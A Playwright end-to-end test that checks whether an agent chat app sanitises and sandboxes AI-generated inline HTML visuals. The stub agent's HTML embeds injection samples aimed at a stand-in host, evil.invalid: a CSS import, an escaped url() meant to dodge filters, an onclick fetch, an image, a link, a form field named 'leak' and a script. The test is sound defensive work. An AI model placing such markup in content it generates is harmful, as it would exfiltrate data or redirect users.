import { expect, test } from "@playwright/test";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { createE2EChatAgent } from "./support/chat-agent";

const cleanupPaths = new Set<string>();

test.afterEach(async () => {
  await Promise.all([...cleanupPaths].map((target) => fs.rm(target, { recursive: true, force: true })));
  cleanupPaths.clear();
});

async function createInlineVisualCodexStub() {
  const stubDirectory = await fs.mkdtemp(path.join(os.tmpdir(), "rudder-e2e-inline-visual-"));
  cleanupPaths.add(stubDirectory);
  const stubPath = path.join(stubDirectory, "codex-inline-visual");
  await fs.writeFile(stubPath, `#!/usr/bin/env node
import fs from "node:fs";
import path from "node:path";
let prompt = "";
process.stdin.setEncoding("utf8");
process.stdin.on("data", (chunk) => { prompt += chunk; });
process.stdin.on("end", () => {
  const visualizeSkillDir = path.join(process.env.CODEX_HOME, "skills", "visualize");
  const skillContract = fs.readFileSync(path.join(visualizeSkillDir, "SKILL.md"), "utf8");
  const runtimeContract = fs.readFileSync(path.join(visualizeSkillDir, "references", "runtime-contract.md"), "utf8");
  const exampleFragment = fs.readFileSync(path.join(visualizeSkillDir, "assets", "example-chart.html"), "utf8");
  if (
    !skillContract.includes('::codex-inline-vis{file="<title>.html"}')
    || !runtimeContract.includes("scriptless")
    || !exampleFragment.includes('id="widget"')
  ) {
    throw new Error("Rudder visualize skill package is incomplete");
  }
  const threadId = "019f6400-1111-7222-8333-444444444444";
  const now = new Date();
  const threadDir = path.join(
    process.env.CODEX_HOME,
    "visualizations",
    String(now.getFullYear()),
    String(now.getMonth() + 1).padStart(2, "0"),
    String(now.getDate()).padStart(2, "0"),
    threadId,
  );
  fs.mkdirSync(threadDir, { recursive: true });
  fs.writeFileSync(path.join(threadDir, "agent-operations-report.html"), [
    '<style>',
    '#widget .report-header{display:flex;align-items:flex-start;justify-content:space-between;gap:16px;padding-bottom:8px;border-bottom:1px solid var(--border)}',
    '#widget .report-period{display:block;margin-bottom:3px;color:var(--muted-foreground);font-size:11px;font-weight:500;letter-spacing:.08em;text-transform:uppercase}',
    '#widget .report-title{font-size:1.28em;line-height:1.25}',
    '#widget .metric-grid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:12px}',
    '#widget .metric{display:grid;gap:2px;min-width:0;padding-top:8px;border-top:2px solid var(--border)}',
    '#widget .metric:first-child{border-top-color:var(--viz-series-1)}',
    '#widget .metric:nth-child(2){border-top-color:var(--viz-series-3)}',
    '#widget .metric:nth-child(3){border-top-color:var(--viz-series-2)}',
    '#widget .metric-label{color:var(--muted-foreground);font-size:12px}',
    '#widget .metric-value{color:var(--foreground);font-size:1.72em;font-weight:500;line-height:1.1}',
    '#widget .metric-note{color:var(--muted-foreground);font-size:11px}',
    '#widget .metric-note-positive{color:var(--primary)}',
    '#widget .report-grid{display:grid;grid-template-columns:minmax(0,1.6fr) minmax(190px,.8fr);align-items:start;gap:16px}',
    '#widget figure{min-width:0;margin:0}',
    '#widget .section-heading{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-bottom:8px;font-size:13px;font-weight:500}',
    '#widget .weekly-bars{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));align-items:end;gap:10px;min-height:142px;padding:6px 4px 0;border-bottom:1px solid var(--border)}',
    '#widget .week{display:grid;grid-template-rows:auto 1fr auto;align-items:end;gap:4px;height:136px;min-width:0;text-align:center}',
    '#widget .week-value{color:var(--foreground);font-size:12px;font-weight:500}',
    '#widget .bar-track{display:flex;height:96px;align-items:end;justify-content:center}',
    '#widget .week-bar{width:min(48px,72%);min-height:10px;border-radius:4px 4px 0 0;background:var(--viz-series-1)}',
    '#widget .week-bar-jul-6{height:60%}',
    '#widget .week-bar-jul-13{height:80%}',
    '#widget .week-bar-jul-20{height:70%}',
    '#widget .week-bar-jul-27{height:100%}',
    '#widget .week-label{padding-bottom:7px;color:var(--muted-foreground);font-size:11px}',
    '#widget .outcomes{display:grid;gap:9px}',
    '#widget .outcome-row{display:grid;gap:5px}',
    '#widget .outcome-label{display:flex;align-items:center;justify-content:space-between;gap:8px;color:var(--muted-foreground);font-size:11px}',
    '#widget .outcome-label strong{color:var(--foreground);font-weight:500}',
    '#widget .outcome-track{height:6px;overflow:hidden;border-radius:999px;background:var(--muted)}',
    '#widget .outcome-fill{height:100%;border-radius:999px}',
    '#widget .outcome-completed{width:91%;background:var(--viz-series-1)}',
    '#widget .outcome-review{width:6%;background:var(--viz-series-2)}',
    '#widget .outcome-failed{width:3%;background:var(--destructive)}',
    '#widget .report-note{display:grid;gap:2px;margin-top:2px;padding:7px 9px;border-inline-start:3px solid var(--viz-series-3);background:var(--card);font-size:11px}',
    '#widget .report-note strong{font-weight:500}',
    '#widget .report-note p{color:var(--muted-foreground)}',
    '#widget details{padding-top:6px;border-top:1px solid var(--border)}',
    '#widget summary{color:var(--muted-foreground);font-size:11px}',
    '#widget details p{padding-top:6px;color:var(--muted-foreground);font-size:11px}',
    '@media (max-width:560px){#widget .metric-grid{grid-template-columns:1fr 1fr}#widget .metric:last-child{grid-column:1/-1}#widget .report-grid{grid-template-columns:1fr}#widget .weekly-bars{min-height:136px}#widget .week{height:130px}#widget .bar-track{height:90px}}',
    '@import url("https://evil.invalid/import.css");',
    '.blocked-url{background-image:url("https://evil.invalid/image.css")}',
    '.blocked-escaped-url{background-image:u\\\\72l("https://evil.invalid/escaped.css")}',
    '</style>',
    '<div id="widget" class="blocked-url blocked-escaped-url">',
    '<header class="report-header"><div><span class="report-period">Jul 6 - Jul 27</span><h2 class="report-title">Execution health</h2></div><span class="viz-badge">On track</span></header>',
    '<section class="metric-grid" aria-label="Key agent operations metrics">',
    '<div class="metric"><span class="metric-label">Completed loops</span><strong id="completed-total" class="metric-value">93</strong><span class="metric-note metric-note-positive">+16 vs prior period</span></div>',
    '<div class="metric"><span class="metric-label">Success rate</span><strong id="success-rate" class="metric-value">91%</strong><span class="metric-note metric-note-positive">+4.2 points</span></div>',
    '<div class="metric"><span class="metric-label">Budget used</span><strong id="budget-used" class="metric-value">$4.6k</strong><span class="metric-note">77% of $6k</span></div>',
    '</section>',
    '<section class="report-grid">',
    '<figure><figcaption class="section-heading"><span>Weekly completed loops</span><span class="text-small text-muted">Target 24</span></figcaption>',
    '<div class="weekly-bars" role="img" aria-label="Weekly completed loops: Jul 6, 18; Jul 13, 24; Jul 20, 21; Jul 27, 30." title="Weekly completed loops: Jul 6, 18; Jul 13, 24; Jul 20, 21; Jul 27, 30.">',
    '<div class="week"><strong class="week-value">18</strong><div class="bar-track"><div class="week-bar week-bar-jul-6"></div></div><span class="week-label">Jul 6</span></div>',
    '<div class="week"><strong class="week-value">24</strong><div class="bar-track"><div class="week-bar week-bar-jul-13"></div></div><span class="week-label">Jul 13</span></div>',
    '<div class="week"><strong class="week-value">21</strong><div class="bar-track"><div class="week-bar week-bar-jul-20"></div></div><span class="week-label">Jul 20</span></div>',
    '<div class="week"><strong class="week-value">30</strong><div class="bar-track"><div class="week-bar week-bar-jul-27"></div></div><span class="week-label">Jul 27</span></div>',
    '</div></figure>',
    '<section class="outcomes" aria-labelledby="outcomes-title"><h3 id="outcomes-title" class="section-heading">Run outcomes</h3>',
    '<div class="outcome-row"><div class="outcome-label"><span>Completed</span><strong>91%</strong></div><div class="outcome-track"><div class="outcome-fill outcome-completed"></div></div></div>',
    '<div class="outcome-row"><div class="outcome-label"><span>Needs review</span><strong>6%</strong></div><div class="outcome-track"><div class="outcome-fill outcome-review"></div></div></div>',
    '<div class="outcome-row"><div class="outcome-label"><span>Failed</span><strong>3%</strong></div><div class="outcome-track"><div class="outcome-fill outcome-failed"></div></div></div>',
    '<div class="report-note"><strong>What changed</strong><p>Review queues cleared 1.8 days faster while weekly throughput reached a new high.</p></div>',
    '</section></section>',
    '<details><summary data-tooltip="Show how the report is calculated">Methodology</summary><p>Completed loops are counted only after the final result is persisted. Budget excludes paused runs.</p></details>',
    '<button id="active-button" onclick="fetch(\\"https://evil.invalid/click\\")">Do not keep</button>',
    '<img src="https://evil.invalid/image.png">',
    '<a href="https://evil.invalid/navigation">Do not navigate</a>',
    '<form action="https://evil.invalid/form"><input name="leak"><button>Send</button></form>',
    '<script>window.__rudderInlineVisualScriptExecuted=true;fetch("https://evil.invalid/script");location.href="https://evil.invalid/self-navigation"</script>',
    '</div>',
  ].join(""));
  const sentinel = prompt.match(/(__RUDDER_RESULT_[a-f0-9-]+__)/i)?.[1] ?? "__RUDDER_RESULT_TEST__";
  const body = "Agent operations snapshot. Throughput is above target and the failure rate remains below 4%.\\n\\n::codex-inline-vis{file=\\\"agent-operations-report.html\\\"}";
  const finalText = sentinel + JSON.stringify({ kind: "message", body, structuredPayload: null });
  process.stdout.write(JSON.stringify({ type: "thread.started", thread_id: threadId, model: "gpt-5.4" }) + "\\n");
  process.stdout.write(JSON.stringify({ type: "item.completed", item: { id: "msg-1", type: "agent_message", text: finalText } }) + "\\n");
  process.stdout.write(JSON.stringify({ type: "turn.completed", result: finalText, usage: { input_tokens: 1, cached_input_tokens: 0, output_tokens: 1 } }) + "\\n");
});
`, "utf8");
  await fs.chmod(stubPath, 0o755);
  return stubPath;
}

test("deterministic Codex visual is declarative, network-isolated, and durable", async ({ page }) => {
  const externalRequests: string[] = [];
  page.on("request", (request) => {
    if (request.url().includes("evil.invalid")) externalRequests.push(request.url());
  });

  const stubPath = await createInlineVisualCodexStub();
  const orgResponse = await page.request.post("/api/orgs", {
    data: { name: `Inline-Visual-${Date.now()}` },
  });
  expect(orgResponse.ok()).toBe(true);
  const organization = await orgResponse.json() as { id: string; issuePrefix: string };
  const agent = await createE2EChatAgent(page.request, organization.id, {
    name: "Operations Analyst",
    command: stubPath,
  }) as { id: string };

  await page.goto("/");
  await page.evaluate((orgId) => {
    window.localStorage.setItem("rudder.selectedOrganizationId", orgId);
  }, organization.id);
  await page.goto(`/chat?agentId=${agent.id}`);

  const composer = page.locator(".rudder-mdxeditor-content").first();
  await expect(composer).toBeVisible({ timeout: 15_000 });
  await composer.fill("Show agent operations health for the last four weeks");
  await page.getByRole("button", { name: "Send" }).click();

  const assistant = page.getByTestId("chat-assistant-message").last();
  await expect(assistant).toContainText("Agent operations snapshot.", { timeout: 20_000 });
  await expect(assistant).not.toContainText("::codex-inline-vis");
  const chatId = new URL(page.url()).pathname.split("/").pop()!;
  const messagesResponse = await page.request.get(`/api/chats/${chatId}/messages?includeTranscript=false`);
  expect(messagesResponse.ok()).toBe(true);
  const persistedMessages = await messagesResponse.json() as Array<{
    id: string;
    role: string;
    structuredPayload: Record<string, unknown> | null;
    attachments: Array<{
      id: string;
      contentType: string;
      provider?: unknown;
      objectKey?: unknown;
    }>;
  }>;
  const persistedAssistant = persistedMessages.find((message) => message.role === "assistant")!;
  expect(persistedAssistant).toMatchObject({
    structuredPayload: {
      inlineVisuals: [{
        directiveIndex: 0,
        file: "agent-operations-report.html",
        status: "ready",
        attachmentId: expect.any(String),
      }],
    },
    attachments: [expect.objectContaining({ contentType: "text/html" })],
  });
  expect(persistedAssistant.attachments[0]?.provider).toBeUndefined();
  expect(persistedAssistant.attachments[0]?.objectKey).toBeUndefined();

  const iframe = assistant.locator("iframe");
  await expect(iframe).toHaveAttribute("sandbox", "allow-same-origin");
  await expect(iframe).not.toHaveAttribute("sandbox", /allow-scripts/);
  const frame = iframe.contentFrame();
  await expect(frame.locator("#completed-total")).toHaveText("93", { timeout: 15_000 });
  await expect(frame.locator("#success-rate")).toHaveText("91%");
  await expect(frame.locator("#budget-used")).toHaveText("$4.6k");
  await expect(frame.getByRole("img", { name: "Weekly completed loops: Jul 6, 18; Jul 13, 24; Jul 20, 21; Jul 27, 30." })).toBeVisible();
  await expect(frame.locator(".week-bar")).toHaveCount(4);
  await expect(frame.locator(".outcome-fill")).toHaveCount(3);
  await expect(frame.locator("body").locator("script, style, link, img, iframe, object, form, input, button, a")).toHaveCount(0);
  await expect(frame.locator("body")).not.toContainText("Do not keep");
  await expect(frame.locator("body")).not.toContainText("Do not navigate");
  await expect(frame.locator("body")).not.toContainText("Send");
  await page.setViewportSize({ width: 1280, height: 720 });
  const workManifestToggle = page.getByTestId("chat-work-manifest-wide-toggle");
  const workManifestPanel = page.getByTestId("chat-work-manifest-wide-panel");
  await expect(workManifestToggle).toHaveAttribute("aria-pressed", "true");
  await expect(workManifestPanel).toBeVisible();
  await expect.poll(() => iframe.evaluate((element) => element.getBoundingClientRect().width))
    .toBeLessThanOrEqual(560);
  await expect.poll(() => frame.locator(".report-grid").evaluate((element) => {
    const style = getComputedStyle(element);
    return {
      display: style.display,
      gap: style.gap,
      columns: style.gridTemplateColumns.trim().split(/\s+/).length,
    };
  })).toEqual({
    display: "grid",
    gap: "16px",
    columns: 1,
  });
  const summary = frame.locator("summary");
  await summary.hover();
  await expect.poll(() => summary.evaluate((element) => getComputedStyle(element, "::after").content))
    .toContain("Show how the report is calculated");
  expect(await frame.locator("body").evaluate(() => ({
    scriptExecuted: Boolean((window as Window & { __rudderInlineVisualScriptExecuted?: boolean }).__rudderInlineVisualScriptExecuted),
    location: window.location.href,
  }))).toEqual({ scriptExecuted: false, location: "about:srcdoc" });
  await page.waitForTimeout(300);
  expect(externalRequests).toEqual([]);

  await page.reload();
  const reopenedAssistant = page.getByTestId("chat-assistant-message").last();
  await expect(reopenedAssistant).toContainText("Agent operations snapshot.", { timeout: 20_000 });
  await expect(reopenedAssistant).not.toContainText("::codex-inline-vis");
  const reopenedIframe = reopenedAssistant.locator("iframe");
  await expect(reopenedIframe).toHaveAttribute("sandbox", "allow-same-origin");
  const reopenedFrame = reopenedIframe.contentFrame();
  await expect(reopenedFrame.locator("#completed-total")).toHaveText("93", { timeout: 15_000 });
  const stackedFrameHeight = await reopenedIframe.evaluate((element) => element.getBoundingClientRect().height);
  const stackedWidgetHeight = await reopenedFrame.locator("#widget").evaluate((element) => element.getBoundingClientRect().height);
  expect(stackedFrameHeight).toBeGreaterThanOrEqual(stackedWidgetHeight);
  expect(await reopenedFrame.locator("body").evaluate(() =>
    Boolean((window as Window & { __rudderInlineVisualScriptExecuted?: boolean }).__rudderInlineVisualScriptExecuted)
  )).toBe(false);
  expect(externalRequests).toEqual([]);

  const screenshotPath = process.env.RUDDER_INLINE_VIS_SCREENSHOT?.trim();
  await expect(workManifestToggle).toHaveAttribute("aria-pressed", "true");
  await workManifestToggle.click();
  await expect(workManifestToggle).toHaveAttribute("aria-pressed", "false");
  await expect(workManifestPanel).toHaveAttribute("aria-hidden", "true");
  await expect(workManifestPanel).toHaveAttribute("data-state", "closed");
  await page.setViewportSize({ width: 1440, height: 900 });
  await expect.poll(() => reopenedIframe.evaluate((element) => element.getBoundingClientRect().width))
    .toBeGreaterThan(560);
  await expect.poll(() => reopenedFrame.locator(".report-grid").evaluate((element) =>
    getComputedStyle(element).gridTemplateColumns.trim().split(/\s+/).length
  )).toBe(2);
  await expect.poll(() => reopenedIframe.evaluate((element) => element.getBoundingClientRect().height))
    .toBeLessThan(stackedFrameHeight - 40);
  const desktopFrameHeight = await reopenedIframe.evaluate((element) => element.getBoundingClientRect().height);
  const desktopWidgetHeight = await reopenedFrame.locator("#widget").evaluate((element) => element.getBoundingClientRect().height);
  expect(desktopFrameHeight).toBeGreaterThanOrEqual(desktopWidgetHeight);
  if (screenshotPath) {
    await reopenedIframe.scrollIntoViewIfNeeded();
    await page.mouse.move(1380, 860);
    await page.screenshot({ path: screenshotPath, fullPage: false, animations: "disabled" });
  }
  await page.setViewportSize({ width: 390, height: 844 });
  await expect(reopenedAssistant).toBeVisible();
  await expect(reopenedFrame.locator("#completed-total")).toHaveText("93");
  await expect.poll(() => reopenedFrame.locator(".report-grid").evaluate((element) =>
    getComputedStyle(element).gridTemplateColumns.trim().split(/\s+/).length
  )).toBe(1);
  await expect.poll(() => reopenedIframe.evaluate((element) => element.getBoundingClientRect().height))
    .toBeGreaterThan(desktopFrameHeight + 100);
  const mobileFrameHeight = await reopenedIframe.evaluate((element) => element.getBoundingClientRect().height);
  const mobileWidgetHeight = await reopenedFrame.locator("#widget").evaluate((element) => element.getBoundingClientRect().height);
  expect(mobileFrameHeight).toBeGreaterThanOrEqual(mobileWidgetHeight);
  if (screenshotPath) {
    await page.screenshot({
      path: screenshotPath.replace(/\.png$/i, "-mobile.png"),
      fullPage: false,
      animations: "disabled",
    });
  }

  await page.setViewportSize({ width: 1280, height: 720 });
  await reopenedAssistant.hover();
  const forkResponsePromise = page.waitForResponse((response) =>
    response.request().method() === "POST"
    && response.url().includes(`/api/chats/${chatId}/fork`),
  );
  await reopenedAssistant.getByRole("button", { name: "Fork from here" }).click();
  const forkResponse = await forkResponsePromise;
  expect(forkResponse.ok()).toBe(true);
  const firstFork = await forkResponse.json() as { id: string };
  await expect(page).toHaveURL(new RegExp(`/chat/${firstFork.id}$`));
  const forkedAssistant = page.getByTestId("chat-assistant-message").filter({
    hasText: "Agent operations snapshot.",
  }).last();
  await expect(forkedAssistant).not.toContainText("::codex-inline-vis");
  const forkedFrame = forkedAssistant.locator("iframe").contentFrame();
  await expect(forkedFrame.locator("#completed-total")).toHaveText("93", { timeout: 15_000 });
  await expect(forkedFrame.locator("script, img, form, input, button, a")).toHaveCount(0);
  expect(externalRequests).toEqual([]);

  const deleteForkResponse = await page.request.delete(`/api/chats/${firstFork.id}`);
  expect(deleteForkResponse.ok()).toBe(true);
  await page.goto(`/chat/${chatId}`);
  const sourceAfterForkDelete = page.getByTestId("chat-assistant-message").filter({
    hasText: "Agent operations snapshot.",
  }).last();
  await expect(sourceAfterForkDelete.locator("iframe").contentFrame().locator("#completed-total")).toHaveText("93", { timeout: 15_000 });

  const secondForkResponse = await page.request.post(`/api/chats/${chatId}/fork`, {
    data: { sourceMessageId: persistedAssistant.id, title: "Visual durability fork" },
  });
  expect(secondForkResponse.ok()).toBe(true);
  const secondFork = await secondForkResponse.json() as { id: string };
  const deleteSourceResponse = await page.request.delete(`/api/chats/${chatId}`);
  expect(deleteSourceResponse.ok()).toBe(true);
  await page.goto(`/chat/${secondFork.id}`);
  const forkAfterSourceDelete = page.getByTestId("chat-assistant-message").filter({
    hasText: "Agent operations snapshot.",
  }).last();
  const durableFrame = forkAfterSourceDelete.locator("iframe").contentFrame();
  await expect(durableFrame.locator("#completed-total")).toHaveText("93", { timeout: 15_000 });
  await expect(durableFrame.locator("script, img, form, input, button, a")).toHaveCount(0);
  expect(externalRequests).toEqual([]);
});
